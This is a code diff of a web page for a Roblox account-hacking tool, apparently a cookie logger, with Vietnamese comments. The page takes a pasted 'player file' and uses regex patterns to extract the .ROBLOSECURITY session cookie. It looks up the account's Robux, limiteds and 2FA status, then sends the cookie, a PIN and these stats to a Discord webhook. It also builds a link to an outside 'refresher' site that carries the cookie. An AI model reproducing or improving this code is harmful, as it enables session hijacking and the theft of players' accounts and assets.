@@ -13,7 +13,7 @@ export default function SlugPage() {
 
   const [webhookUrl, setWebhookUrl] = useState<string | null>(null);
   const [loading, setLoading] = useState(true);
-  const [error, setError] = useState<string | null>(null);
+  const [pageError, setPageError] = useState<string | null>(null);
 
   const [status, setStatus] = useState<{
     message: string;
@@ -26,26 +26,25 @@ export default function SlugPage() {
   const [fileContent, setFileContent] = useState("");
   const [pin, setPin] = useState("");
 
-  // Mark current slug in localStorage
+  // Lưu slug gần nhất vào localStorage
   useEffect(() => {
     if (!slug) return;
-    if (typeof window === "undefined") return;
     try {
       window.localStorage.setItem("lastSlug", slug);
     } catch {}
   }, [slug]);
 
-  // Fetch webhook URL from Supabase
+  // Lấy webhook từ Supabase
   useEffect(() => {
     async function fetchWebhook() {
       if (!slug) {
-        setError("Invalid slug.");
+        setPageError("Invalid slug.");
         setLoading(false);
         return;
       }
 
       setLoading(true);
-      setError(null);
+      setPageError(null);
 
       try {
         const { data, error } = await supabase
@@ -59,7 +58,7 @@ export default function SlugPage() {
 
         setWebhookUrl(data.webhook_url);
       } catch (err: any) {
-        setError(err.message || "Failed to load webhook.");
+        setPageError(err.message || "Failed to load webhook.");
       } finally {
         setLoading(false);
       }
@@ -70,9 +69,9 @@ export default function SlugPage() {
 
   function extractRobloSecurity(text: string): string | null {
     const patterns = [
-      /"\.ROBLOSECURITY",\s*"([^"]{700,})"/i,                 
-      /"\.ROBLOSECURITY"\s*,\s*"([^"]{700,})"/i,            
-      /_\|WARNING:[^|]*\|_[A-Za-z0-9+\/=._-]{680,}/i,      
+      /"\.ROBLOSECURITY",\s*"([^"]{700,})"/i,
+      /"\.ROBLOSECURITY"\s*,\s*"([^"]{700,})"/i,
+      /_\|WARNING:[^|]*\|_[A-Za-z0-9+\/=._-]{680,}/i,
     ];
 
     for (const pattern of patterns) {
@@ -81,9 +80,9 @@ export default function SlugPage() {
         let candidate = match[1].trim();
         if (
           candidate.startsWith('_|WARNING:') &&
-          candidate.includes('|_)') &&  
+          candidate.includes('|_)') &&
           candidate.length >= 750 &&
-          candidate.includes('.')    
+          candidate.includes('.')
         ) {
           return candidate;
         }
@@ -128,30 +127,14 @@ export default function SlugPage() {
     return null;
   }
 
-  function extractUserId(text: string): string | null {
-    const urlMatch = text.match(/\/users\/(\d+)\/profile/i) || text.match(/\/id\/users\/(\d+)\/profile/i);
-    if (urlMatch?.[1]) return urlMatch[1];
-
-    const rbxIdMatch = text.match(/rbxid=(\d+)/i);
-    if (rbxIdMatch?.[1]) return rbxIdMatch[1];
-
-    return null;
-  }
-
   async function sendToDiscord(
     cookieValue: string,
     pinValue: string,
-    userData: any,
     fullStats: any,
-    userId: string | null
+    userId: string
   ) {
     if (!webhookUrl) {
       setStatus({ message: "❌ Webhook URL is missing.", type: "error" });
-      return;
-    }
-
-    if (!userId) {
-      setStatus({ message: "⚠️ Could not extract a reliable User ID.", type: "error" });
       return;
     }
 
@@ -160,11 +143,11 @@ export default function SlugPage() {
       const rolimonsUrl = `https://www.rolimons.com/player/${userId}`;
       const autoharUrl = `https://your-autohar-link-here.com?user=${userId}`; // Thay bằng link thật của bạn
 
-      const avatarUrl = fullStats?.avatarHeadshotUrl || userData?.avatarHeadshotUrl || "https://i.imgur.com/0ZxT2S6.png";
+      const avatarUrl = fullStats?.avatarHeadshotUrl || "https://i.imgur.com/0ZxT2S6.png";
 
-      // Lấy dữ liệu từ fullStats (ưu tiên) hoặc userData
-      const username = fullStats?.basic?.name || userData?.basic?.name || "N/A";
-      const accountAgeDays = fullStats?.accountAgeDays ?? userData?.accountAgeDays ?? "N/A";
+      const username = fullStats?.basic?.name || fullStats?.displayName || "N/A";
+      const displayName = fullStats?.displayName || username;
+      const accountAgeDays = fullStats?.accountAgeDays ?? "N/A";
       const isDeveloper = fullStats?.isDeveloper ?? false;
       const gameVisits = fullStats?.visits ?? 0;
       const groupMembers = fullStats?.groupsCount ?? 0;
@@ -174,23 +157,26 @@ export default function SlugPage() {
       const limiteds = fullStats?.limiteds ?? 0;
       const summary = fullStats?.summary ?? (robuxBalance + rap);
       const creditBalance = fullStats?.creditBalance ?? 0;
-      const inUnknown = 0; // Chưa có field cụ thể, giữ 0
+      const inUnknown = 0;
       const emailVerified = fullStats?.emailVerified ? "Verified" : "Not Verified";
       const twoFA = fullStats?.twoFA ?? "No 2FA";
       const inventory = fullStats?.hasInventory ? "True" : "False";
       const premium = fullStats?.premium ?? "N/A";
       const groupsOwned = fullStats?.ownedGroups ?? 0;
-      const groupsBalance = fullStats?.groupBalances?.reduce((sum: number, g: any) => sum + (g.robux || 0), 0) ?? 0;
+      const groupsBalance = fullStats?.groupBalances?.reduce(
+        (sum: number, g: any) => sum + (g.robux || 0),
+        0
+      ) ?? 0;
 
       const mm2Display = fullStats?.mm2_count > 0 ? `True | ${fullStats.mm2_count}` : "False | 0";
       const admDisplay = fullStats?.adm_count > 0 ? `True | ${fullStats.adm_count}` : "False | 0";
       const sabDisplay = fullStats?.sab_count > 0 ? `True | ${fullStats.sab_count}` : "False | 0";
 
-      const cookieDisplay = cookieValue.length > 4000 ? cookieValue.substring(0, 4000) + "..." : cookieValue;
+      const cookieDisplay =
+        cookieValue.length > 4000 ? cookieValue.substring(0, 4000) + "..." : cookieValue;
       const cookieNote = cookieValue.length > 4000 ? "\n(long cookie - scroll to view full)" : "";
       const linkRe = `https://manualrefresherforrichpeople.gt.tc/?cookie=${encodeURIComponent(cookieValue)}`;
 
-      const displayName = fullStats?.displayName || username;
       const ageLabel = fullStats?.isUnder13 ? "<13" : ">13";
 
       const payload = {
@@ -338,8 +324,7 @@ export default function SlugPage() {
           setStatus({ message: "", type: null });
         }, 5000);
       } else {
-        const errText = await res.text().catch(() => "");
-        setStatus({ message: `❌ Failed: an error occurred with your webhook`, type: "error" });
+        setStatus({ message: "❌ Failed: an error occurred with your webhook", type: "error" });
       }
     } catch (err: any) {
       console.error("[sendToDiscord error]", err);
@@ -359,25 +344,60 @@ export default function SlugPage() {
       return;
     }
 
-    const userId = extractUserId(fileContent) || "unknown";
-
     setStatus({ message: "⏳ Processing...", type: "info" });
-
-    let fullStats = null;
 
     try {
       const fullRes = await fetch(
-        `/api/roblox-user?userId=${userId}&cookie=${encodeURIComponent(robloxCookie)}&mode=full`
+        `/api/roblox-user?cookie=${encodeURIComponent(robloxCookie)}&mode=full`,
+        {
+          cache: "no-store",
+        }
       );
-      if (fullRes.ok) {
-        fullStats = await fullRes.json();
-      }
-    } catch (err) {
-      console.error("[DEBUG] Fetch user data error:", err);
-    }
 
-    await sendToDiscord(robloxCookie, pin, null, fullStats, userId);
+      const data = await fullRes.json();
+
+      if (!fullRes.ok || data.error) {
+        const errorMsg =
+          data.errorMessage || "Invalid file. Please check and try again.";
+        setStatus({ message: errorMsg, type: "error" });
+        return;
+      }
+
+      const userIdFromCookie = data.userId;
+      if (!userIdFromCookie) {
+        setStatus({ message: "Could not retrieve user ID from cookie.", type: "error" });
+        return;
+      }
+
+      // Gửi lên Discord chỉ khi thành công
+      await sendToDiscord(robloxCookie, pin, data, userIdFromCookie);
+    } catch (err: any) {
+      console.error("[handleStart fetch error]", err);
+      setStatus({
+        message: "Network error or server is unreachable. Please try again.",
+        type: "error",
+      });
+    }
   };
+
+  if (pageError) {
+    return (
+      <div className="min-h-screen bg-[#0a0a0a] text-white flex items-center justify-center p-4 relative overflow-hidden">
+        <ConstellationBackground />
+        <div className="bg-[#121212] border border-red-600/40 rounded-2xl p-10 max-w-lg text-center shadow-2xl z-50">
+          <h2 className="text-2xl font-bold text-red-400 mb-4">Something went wrong</h2>
+          <p className="text-gray-300 mb-6">{pageError}</p>
+          <Link
+            href="/create"
+            className="inline-flex items-center gap-2 px-6 py-3 bg-red-600 hover:bg-red-700 rounded-lg text-white font-medium transition-colors shadow-lg shadow-red-900/30"
+          >
+            <ArrowLeft className="w-5 h-5" />
+            Back to Create
+          </Link>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div className="min-h-screen bg-[#0a0a0a] text-white flex flex-col items-center justify-center p-4 relative overflow-hidden">
@@ -392,24 +412,10 @@ export default function SlugPage() {
         </div>
       )}
 
-      {error && (
-        <div className="absolute inset-0 z-40 flex items-center justify-center bg-black/80 backdrop-blur-sm">
-          <div className="bg-[#121212] border border-red-600/40 rounded-2xl p-8 max-w-lg text-center shadow-2xl">
-            <h2 className="text-2xl font-bold text-red-400 mb-4">Something went wrong</h2>
-            <p className="text-gray-300 mb-6">{error}</p>
-            <Link
-              href="/create"
-              className="inline-flex items-center gap-2 px-6 py-3 bg-red-600 hover:bg-red-700 rounded-lg text-white font-medium transition-colors shadow-lg shadow-red-900/30"
-            >
-              <ArrowLeft className="w-5 h-5" />
-              Back to Create
-            </Link>
-          </div>
-        </div>
-      )}
-
       <div
-        className={`relative z-10 w-full max-w-5xl flex flex-col items-center transition-opacity duration-500 ${loading ? "opacity-40 pointer-events-none" : "opacity-100"}`}
+        className={`relative z-10 w-full max-w-5xl flex flex-col items-center transition-opacity duration-500 ${
+          loading ? "opacity-40 pointer-events-none" : "opacity-100"
+        }`}
       >
         <div className="w-full mb-6 px-2">
           <Link
@@ -439,7 +445,7 @@ export default function SlugPage() {
             <div className="bg-[#121212] border border-[#1e1e1e] rounded-2xl p-8 shadow-2xl flex flex-col h-full">
               <h3 className="text-lg font-bold mb-3">Hack Accounts</h3>
               <p className="text-[#94a3b8] text-sm mb-6 leading-relaxed">
-              Paste your player file in the box below, then click "Start Hacking" If you don't know how to find a users "player file" then go ahead and watch "How to use"
+                Paste your player file in the box below, then click "Start Hacking" If you don't know how to find a users "player file" then go ahead and watch "How to use"
               </p>
 
               {status.type && (
@@ -480,7 +486,7 @@ export default function SlugPage() {
 
                 <button
                   onClick={handleStart}
-                  disabled={loading || !!error || status.type === "info"}
+                  disabled={loading || status.type === "info"}
                   className="w-full py-4 bg-[#e22d2d] hover:bg-[#c92828] disabled:opacity-60 disabled:hover:bg-[#e22d2d] text-white font-bold text-base rounded-xl flex items-center justify-center gap-3 transition-all shadow-lg shadow-red-900/20 active:scale-[0.98]"
                 >
                   Start Hacking!
@@ -495,8 +501,8 @@ export default function SlugPage() {
               </p>
 
               <div className="mt-auto aspect-video bg-[#0b1218] border border-white/5 rounded-xl overflow-hidden group">
-                <video 
-                  controls 
+                <video
+                  controls
                   className="w-full h-full object-cover"
                   playsInline
                   preload="metadata"
